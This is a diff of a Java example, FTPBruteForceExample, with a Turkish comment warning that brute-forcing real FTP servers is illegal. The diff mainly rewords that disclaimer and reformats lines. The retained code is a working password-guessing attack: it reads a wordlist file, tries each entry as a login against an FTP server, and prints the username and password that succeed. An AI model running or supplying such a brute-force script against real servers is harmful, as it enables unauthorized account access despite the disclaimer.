@@ -5,10 +5,10 @@ import java.io.FileReader;
 import java.io.IOException;
 
 /*
-Lütfen unutmayın, bu örnek sadece bir senaryo olarak sunulmuştur ve gerçek bir FTP sunucusuna 
-brute force saldırısı yapmak yasa dışıdır. Bu tür saldırıları gerçekleştirmemelisiniz. 
-Öğrenme amacıyla kullanılıyorsanız bile, herhangi bir sisteme izin almadan veya sahibinin rızası 
-olmadan müdahale etmek doğru değildir. Lütfen etik ve yasal sınırlar içinde kalın.
+Bu örnek sadece bir senaryodur ve gerçek bir FTP sunucusuna brute force saldırısı 
+yapmak yasa dışıdır. Bu tür saldırıları gerçekleştirmemelisiniz. Öğrenme amacıyla 
+olsa bile, herhangi bir sisteme izin almadan veya sahibinin rızası olmadan 
+müdahale etmeyin.
 
 - Brute force saldırısı, bir şifreleme veya kimlik doğrulama sisteminin zayıf noktalarını 
 keşfetmek için deneme-yanılma yöntemini kullanan bir saldırı türüdür. 
@@ -35,7 +35,6 @@ public class FTPBruteForceExample {
         int port = 21;
         String username = "your-username";
         String passwordsFile = "passwords.txt";
-
         FTPClient ftpClient = new FTPClient();
 
         try {
@@ -45,15 +44,15 @@ public class FTPBruteForceExample {
             while ((password = reader.readLine()) != null) {
                 ftpClient.connect(server, port);
                 boolean loginSuccessful = ftpClient.login(username, password);
-
                 if (loginSuccessful) {
-                    System.out.println("Successful login! Username: " + username + ", Password: " + password);
+                    System.out.println("Successful login! Username: " 
+                                       + username 
+                                       + ", Password: " 
+                                       + password);
                     break;
                 }
-
                 ftpClient.logout();
             }
-
             reader.close();
         } catch (IOException e) {
             e.printStackTrace();
